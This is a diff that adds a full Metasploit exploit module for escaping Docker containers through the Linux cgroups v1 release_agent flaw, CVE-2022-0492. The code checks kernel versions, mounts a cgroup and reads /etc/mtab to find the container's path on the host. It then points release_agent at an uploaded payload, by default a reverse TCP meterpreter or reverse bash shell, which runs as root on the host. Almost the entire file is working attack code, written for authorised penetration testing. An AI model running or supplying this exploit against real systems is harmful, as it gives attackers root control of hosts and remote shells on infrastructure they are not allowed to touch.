@@ -1,0 +1,163 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
+
+  include Msf::Post::Linux::Priv
+  include Msf::Post::Linux::Kernel
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Docker cgroups Container Escape',
+        'Description' => %q{
+          This exploit module takes advantage of a Docker image which has either the privileged flag, or SYS_ADMIN Linux capability.
+          If the host kernel is vulnerable, its possible to escape the Docker image and achieve root on the host operating system.
+
+          A vulnerability was found in the Linux kernel's cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function.
+          This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges
+          and bypass the namespace isolation unexpectedly.
+
+          More simply put, cgroups v1 has a feature called release_agent that runs a program when a process in the cgroup terminates.
+          If notify_on_release is enabled, the kernel runs the release_agent binary as root. By editing the release_agent file,
+          an attacker can execute their own binary with elevated privileges, taking control of the system. However, the release_agent
+          file is owned by root, so only a user with root access can modify it.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die', # msf module
+          'Yiqi Sun', # discovery
+          'Kevin Wang', # discovery
+          'T1erno', # POC
+        ],
+        'Platform' => [ 'unix', 'linux' ],
+        'SessionTypes' => ['meterpreter'],
+        'DefaultOptions' => {
+          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
+        },
+        'Privileged' => true,
+        'References' => [
+          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af'],
+          [ 'URL', 'https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/'],
+          [ 'URL', 'https://github.com/T1erno/CVE-2022-0492-Docker-Breakout-Checker-and-PoC'],
+          [ 'URL', 'https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492'],
+          [ 'URL', 'https://github.com/SofianeHamlaoui/CVE-2022-0492-Checker/blob/main/escape-check.sh'],
+          [ 'URL', 'https://pwning.systems/posts/escaping-containers-for-fun/'],
+          [ 'URL', 'https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html'],
+          [ 'URL', 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation'],
+          [ 'URL', 'https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/'],
+          [ 'CVE', '2022-0492']
+        ],
+        'DisclosureDate' => '2022-02-04',
+        'Targets' => [
+          ['BINARY', { 'Arch' => [ARCH_X86, ARCH_X64], 'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' } }],
+          ['CMD', { 'Arch' => ARCH_CMD, 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } }]
+        ],
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+    register_advanced_options [
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def check
+    print_status('Unable to determine host OS, this check method is unlikely to be accurate if the host isn\'t Ubuntu')
+    release = kernel_release
+    # https://people.canonical.com/~ubuntu-security/cve/2022/CVE-2022-0492
+    release_short = Rex::Version.new(release.split('-').first)
+    release_long = Rex::Version.new(release.split('-')[0..1].join('-'))
+    if release_short >= Rex::Version.new('5.13.0') && release_long < Rex::Version.new('5.13.0-37.42') || # Ubuntu 21.10
+       release_short >= Rex::Version.new('5.4.0') && release_long < Rex::Version.new('5.4.0-105.119') || # Ubuntu 20.04 LTS
+       release_short >= Rex::Version.new('4.15.0') && release_long < Rex::Version.new('4.15.0-173.182') || # Ubuntu 18.04 LTS
+       release_short >= Rex::Version.new('4.4.0') && release_long < Rex::Version.new('4.4.0-222.255') # Ubuntu 16.04 ESM
+      return CheckCode::Vulnerable("IF host OS is Ubuntu, kernel version #{release} is vulnerable")
+    end
+
+    CheckCode::Safe("Kernel version #{release} may not be vulnerable depending on the host OS")
+  end
+
+  def exploit
+    # Check if we're already root as its required
+    fail_with(Failure::NoAccess, 'The exploit needs a session as root (uid 0) inside the container') unless is_root?
+
+    # create mount
+    folder = rand_text_alphanumeric(5..10)
+    @mount_dir = "#{base_dir}/#{folder}"
+    register_dir_for_cleanup(@mount_dir)
+    vprint_status("Creating folder for mount: #{@mount_dir}")
+    mkdir(@mount_dir)
+    print_status('Mounting cgroup')
+    cmd_exec("mount -t cgroup -o rdma cgroup '#{@mount_dir}'")
+    group = rand_text_alphanumeric(5..10)
+    group_full_dir = "#{@mount_dir}/#{group}"
+    vprint_status("Creating folder in cgroup for exploitation: #{group_full_dir}")
+    mkdir(group_full_dir)
+
+    print_status("Enabling notify on release for group #{group}")
+    write_file("#{group_full_dir}/notify_on_release", '1')
+
+    print_status('Determining the host OS path for image')
+    # for this, we need the line that starts with overlay, and contains an 'upperdir' parameter, which we want the value of
+    mtab_file = read_file('/etc/mtab')
+    host_path = nil
+    mtab_file.each_line do |line|
+      next unless line.start_with?('overlay') && line.include?('perdir') # upperdir
+
+      line.split(',').each do |parameter|
+        next unless parameter.start_with?('upperdir')
+
+        parameter = parameter.split('=')
+        fail_with(Failure::UnexpectedReply, 'Unable to determine docker image path on host OS') unless parameter.length > 1
+        host_path = parameter[1]
+      end
+      break
+    end
+
+    fail_with(Failure::UnexpectedReply, 'Unable to determine docker image path on host OS') if host_path.nil? || host_path.empty? || host_path.start_with?('sed') # start_with catches repeat of command
+
+    vprint_status("Host OS path for image: #{host_path}")
+
+    payload_path = "#{base_dir}/#{rand_text_alphanumeric(5..10)}"
+    print_status("Setting release_agent path to: #{host_path}#{payload_path}")
+    write_file "#{@mount_dir}/release_agent", "#{host_path}#{payload_path}"
+
+    print_status("Uploading payload to #{payload_path}")
+    if target.name == 'CMD'
+      # for whatever reason it's unhappy and wont run without the /bin/sh header
+      upload_and_chmodx payload_path, "#!/bin/sh\n#{payload.encoded}\n"
+    elsif target.name == 'BINARY'
+      upload_and_chmodx payload_path, generate_payload_exe
+    end
+    register_files_for_cleanup(payload_path)
+
+    print_status("Triggering payload with command: sh -c \"echo \$\$ > #{group_full_dir}/cgroup.procs\"")
+    cmd_exec(%(sh -c "echo \$\$ > '#{group_full_dir}/cgroup.procs'"))
+  end
+
+  def cleanup
+    if @mount_dir
+      vprint_status("Cleanup: Unmounting #{@mount_dir}")
+      cmd_exec("umount '#{@mount_dir}'")
+    end
+    super
+  end
+end
